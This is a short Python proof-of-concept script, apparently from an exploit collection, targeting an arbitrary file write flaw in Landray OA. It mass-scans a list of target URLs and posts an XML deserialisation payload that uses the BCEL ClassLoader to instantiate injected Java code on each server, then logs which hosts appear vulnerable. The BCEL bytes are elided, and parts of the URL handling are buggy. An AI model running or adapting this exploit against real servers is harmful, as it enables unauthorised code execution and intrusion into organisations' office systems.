#!/usr/bin/env python
# encoding: utf-8
'''

@Author         : xd
@Date           : 2021-12-08 23:24
@Description    : Landray OA arbitrary file write vulnerability POC.

'''
import requests

header = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded"
}
path=''
urls = open('urls.txt', 'r').read().split('\n')
data = 'var={"body":{"file":"/sys/search/sys_search_main/sysSearchMain.do?method=editParam"}}&fdParemNames=11&fdParameters=<java><void+class%3d"com.sun.org.apache.bcel.internal.util.ClassLoader"><void+method%3d"loadClass"><string>$$BCEL$$.....</string><void+method%3d"newInstance"></void></void></void></java>'
for i in urls:
    fo = open('wirte_log.txt', 'a')
    url1 = i + '/sys/ui/extend/varkind/custom.jsp'
    url2 = i + path
    try:
        r = requests.post(url=url1, data=data, headers=header, verify=False, timeout=5)
        url = i + url2
        rs = requests.get(url=url2,timeout=5)
        fo.write("[*] Request, please wait %s\n" % i)
        if r.status_code == 200 and rs.status_code == 200:
            fo.write("[+] %s There is loophole\n" % i)
        else:
            fo.write("[-] %s No loopholes\n" % i)
    except Exception as e:
        fo.write("[-] %s The request failed %s\n" % (i, e))

    fo.close()
